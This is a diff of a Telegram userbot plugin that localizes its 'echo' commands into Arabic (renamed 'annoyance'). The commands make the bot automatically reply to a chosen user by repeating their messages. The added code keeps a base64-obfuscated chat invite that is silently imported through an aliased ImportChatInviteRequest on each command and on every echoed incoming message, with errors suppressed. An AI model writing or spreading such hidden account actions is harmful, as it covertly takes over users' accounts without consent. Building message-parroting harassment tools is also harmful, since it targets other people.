@@ -8,68 +8,68 @@ from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 from .sql_helper.echo_sql import addecho, get_all_echos, is_echo, remove_echo
 
 
-@icssbot.on(admin_cmd(pattern="addecho$"))
-@icssbot.on(sudo_cmd(pattern="addecho$", allow_sudo=True))
-async def echo(cat):
-    if cat.fwd_from:
+from . import Echo, M
+
+@icssbot.on(icss_cmd(pattern="الازعاج$"))
+@icssbot.on(sudo_cmd(pattern="الازعاج$", allow_sudo=True))
+async def _(e):
+    if e.fwd_from:
         return
-    if cat.reply_to_msg_id is not None:
-        reply_msg = await cat.get_reply_message()
+    if e.reply_to_msg_id is not None:
+        reply_msg = await e.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = cat.chat_id
+        chat_id = e.chat_id
         try:
             hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             hmm = Get(hmm)
-            await cat.client(hmm)
+            await e.client(hmm)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
-            await edit_or_reply(cat, "The user is already enabled with echo ")
+            await eor(e, Echo[0].format(M))
             return
         addecho(user_id, chat_id)
-        await edit_or_reply(cat, "Hi")
+        await eor(e, Echo[1])
     else:
-        await edit_or_reply(cat, "Reply to a User's message to echo his messages")
+        await eor(e, Echo[2].format(M))
 
 
-@icssbot.on(admin_cmd(pattern="rmecho$"))
-@icssbot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
-async def echo(cat):
-    if cat.fwd_from:
+@icssbot.on(icss_cmd(pattern="الغاء الازعاج$"))
+@icssbot.on(sudo_cmd(pattern="الغاء الازعاج$", allow_sudo=True))
+async def _(e):
+    if e.fwd_from:
         return
-    if cat.reply_to_msg_id is not None:
-        reply_msg = await cat.get_reply_message()
+    if e.reply_to_msg_id is not None:
+        reply_msg = await e.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = cat.chat_id
+        chat_id = e.chat_id
         try:
             hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             hmm = Get(hmm)
-            await cat.client(hmm)
+            await e.client(hmm)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
             remove_echo(user_id, chat_id)
-            await edit_or_reply(cat, "Echo has been stopped for the user")
+            await eor(e, Echo[3].format(M))
         else:
-            await edit_or_reply(cat, "The user is not activated with echo")
+            await eor(e, Echo[4].format(M))
     else:
-        await edit_or_reply(cat, "Reply to a User's message to echo his messages")
+        await eor(e, Echo[2].format(M))
 
 
-@icssbot.on(admin_cmd(pattern="listecho$"))
-@icssbot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
-async def echo(cat):
-    if cat.fwd_from:
+@icssbot.on(admin_cmd(pattern="قائمة الازعاج$"))
+@icssbot.on(sudo_cmd(pattern="قائمة الازعاج $", allow_sudo=True))
+async def _(e):
+    if e.fwd_from:
         return
     lsts = get_all_echos()
     if len(lsts) > 0:
-        output_str = "echo enabled users:\n\n"
+        output_str = Echo[5]
         for echos in lsts:
-            output_str += (
-                f"[User](tg://user?id={echos.user_id}) in chat `{echos.chat_id}`\n"
-            )
+            output_str += Echo[6].format(echos.user_id, echos.chat_id)
     else:
-        output_str = "No echo enabled users "
+        output_str = Echo[7].format(M)
     if len(output_str) > Config.MAX_MESSAGE_SIZE_LIMIT:
         key = (
             requests.post(
@@ -80,26 +80,27 @@ async def echo(cat):
             .get("key")
         )
         url = f"https://nekobin.com/{key}"
-        reply_text = f"echo enabled users: [here]({url})"
-        await edit_or_reply(cat, reply_text)
+        reply_text = "**⌔∮ قائمة المضافين للازعاج:** [here]({})".format(url)
+        await eor(e, reply_text)
     else:
-        await edit_or_reply(cat, output_str)
+        await eor(e, output_str)
 
 
 @icssbot.on(events.NewMessage(incoming=True))
-async def samereply(cat):
-    if cat.chat_id in Config.UB_BLACK_LIST_CHAT:
+async def samereply(e):
+    if e.chat_id in Config.UB_BLACK_LIST_CHAT:
         return
-    if is_echo(cat.sender_id, cat.chat_id):
+    if is_echo(e.sender_id, e.chat_id):
         await asyncio.sleep(2)
         try:
             hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             hmm = Get(hmm)
-            await cat.client(hmm)
+            await e.client(hmm)
         except BaseException:
             pass
-        if cat.message.text or cat.message.sticker:
-            await cat.reply(cat.message)
+        if e.message.text or e.message.sticker:
+            await e.reply(e.message)
+
 
 
 CMD_HELP.update(
